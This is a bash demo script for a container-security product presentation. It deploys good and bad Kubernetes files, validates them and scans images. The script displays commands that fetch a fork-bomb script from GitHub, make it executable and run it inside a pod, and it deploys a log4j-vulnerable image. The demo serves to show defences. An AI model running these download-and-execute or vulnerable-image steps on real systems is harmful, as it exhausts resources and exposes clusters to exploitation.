#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m' # No Color

# Install necessary Ubuntu packages
# Check if pv package is installed
dpkg -s pv >/dev/null
if [ $? -eq 1 ]
then
   sudo apt-get install -y pv
fi

# Check if meld package is installed
dpkg -s meld >/dev/null
if [ $? -eq 1 ]
then
   sudo apt-get install -y meld
fi

# Check that cbctl is present in the PATH
which cbctl >/dev/null
if [ $? -eq 1 ]
then
   echo -e "Please install ${RED}cbctl${NC} in your PATH"
   exit 1
fi

# if minikube exist, then define kubectl alias
which minikube >/dev/null
if [ $? -eq 0 ]
then
   shopt -s expand_aliases
   alias kubectl='minikube kubectl'
   intro="For this demo, we will use minikube."
fi

# if microk8s exist, then define kubectl alias
which microk8s >/dev/null
if [ $? -eq 0 ]
then
   shopt -s expand_aliases
   alias kubectl='microk8s kubectl'
   intro="For this demo, we will use microK8s."
fi

########################
# include the magic
########################
. demo-magic.sh

# pe  : Print and Execute.
# pei : Print and Execute immediately.
# p   : Print only.
# w   : wait
# cmd : interactive mode

clear
echo "---"
echo "Preparing demo..."

rm -f good.yaml bad.yaml >/dev/null 2>&1

kubectl delete deployment nodeapp >/dev/null 2>&1
kubectl delete service nodeapp-service >/dev/null 2>&1

kubectl delete pod log4j >/dev/null 2>&1
kubectl delete pod nginx >/dev/null 2>&1

clear
echo "---"
echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect:"
echo -e " - K8s onprem"
echo -e " - K8s in public cloud, for example Amazon, Azure, or Google..."
echo -e " - minikube"
echo -e " - microK8s"
echo -e " - and of course VMware Tanzu."

if test -z "$intro" 
then
      echo ""
else
      wait
      echo ""
      echo ${intro}
fi

wait

echo ""
echo "---"
echo -e "Let's check that CBC is ${GREEN}running${NC} in this K8s cluster."
echo -e "How to check what pods are running in the K8s cluster?"
pe "kubectl get pods -A"

wait
echo ""
echo "---"
echo -e "CBC is running in it's own NAMESPACE ${GREEN}cbcontainers-dataplane${NC}."
wait

clear
echo "---"
echo -e "VMware CBC is deployed in each K8s cluster."
echo -e "VMware CBC ${GREEN}node agent${NC} is deployed as a ${GREEN}daemonset${NC} in each K8s node."
echo "It means that in a K8s cluster with CBC, on each K8s node, a CBC agent will run."
echo "Daemonsets are commonly used for monitoring, networking and security solutions."
pe "kubectl get daemonsets -n cbcontainers-dataplane"
wait

clear
echo -e "---"
echo -e "We would like to deploy a ${GREEN}node.js${NC} application called ${GREEN}nodeapp${NC}."
echo -e "But before deploying it, we would like to apply a security policy."
echo -e "In CBC UI, create a policy to ${RED}BLOCK deployments with no CPU/mem quotas${NC}."
echo -e ""
echo -e "Why a ${RED}minimum${NC} quota?"
p "To be sure the pod will have enough CPU/mem to run correctly."
echo -e "Why a ${RED}maximum${NC} quota?"
p "To be sure the pod will not eat all CPU/mem, because of a bug or a cryptominer virus or someone playing Pacman..."

wait
clear
echo -e "---"
echo -e "We have prepared 2 deployment files, the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/good/deployment.yaml >/dev/null  2>&1
mv deployment.yaml good.yaml 2>/dev/null
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/bad/deployment.yaml >/dev/null  2>&1
mv deployment.yaml bad.yaml 2>/dev/null
pe "ls *.yaml"
wait

clear
echo "---"
echo -e "Let's do a diff between the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
pe "meld good.yaml bad.yaml &"
wait

clear
echo "---"
echo -e "Let's try to deploy the ${RED}BAD${NC} deployment file."
pe "kubectl apply -f bad.yaml"

#Hack:
kubectl delete service nodeapp-service >/dev/null 2>&1

wait
echo ""
echo -e "Deployment of ${RED}BAD${NC} deployment file has failed."
echo "Check logs in K8s violations."
wait

clear
echo ""
echo -e "Now, Let's try to deploy the ${GREEN}GOOD${NC} deployment file."
pe "kubectl apply -f good.yaml"
wait

clear
echo "---"
echo "How to check if the app is running, and on which port is it listening?"
pe "kubectl get all"

wait
echo ""
echo "So, how to check if the app is running?"
pe "firefox http://127.0.0.1:30333 &"
wait

clear
echo "---"
echo -e "As a developer, how can I ${GREEN}validate${NC} my YAML file to deploy the image?"
echo -e "As a developer, I would like do it ${GREEN}manually${NC} or automate the validation in my ${GREEN}CICD pipeline${NC}."
echo -e "Let's validate the ${GREEN}GOOD${NC} deployment file"
pe "cbctl k8s-object validate -f good.yaml"

wait
echo "---"
echo -e "So, what was wrong with the ${RED}BAD${NC} deployment file?"
pe "cbctl k8s-object validate -f bad.yaml"
wait

clear
echo "---"
echo "Let's list all pods:"
pe "kubectl get pods"

firstpod=`kubectl get pods --no-headers | head -n1 | awk '{print $1;}'`

wait
echo ""
echo -e "Let's open a shell in the pod, and try to download a malware"
echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
echo -e "${RED}chmod +x fork-bomb.sh${NC}"
echo -e "${RED}./fork-bomb.sh${NC}"
echo -e "It's a fork bomb, but luckily we have a ${GREEN}CPU quota${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"
wait

clear
echo "---"
echo -e "Modify CBC K8s to ${RED}BLOCK --- COMMAND / Exec to container---${NC}"
wait
echo ""
echo -e "Let's open a shell in the pod, and try to download a malware"
echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
echo -e "${RED}chmod +x fork-bomb.sh${NC}"
echo -e "${RED}./fork-bomb.sh${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"
wait

clear
echo "---"
echo -e "Modify CBC K8s to ${RED}BLOCK --- CONTAINER IMAGES / Critical vulnerabilities ---${NC}"
echo -e "Create an ${GREEN}exception${NC} if needed"

wait
echo "In our CICD pipeline we have integrated the automated vulnerability scan of all container images"
echo -e "Let's try to deploy an image containing a ${RED}critical vulnerability${NC}"
pe "kubectl run log4j --image=tamirmich/log4j2-demo:0.0.3"

wait
echo ""
echo -e "Let's scan a container with the ${RED}log4j vulnerability${NC} ... it will be long"
pe "cbctl image scan tamirmich/log4j2-demo:0.0.3"

echo ""
echo ""
echo -e "${GREEN}THANK YOU!${NC}"
echo ""
echo ""

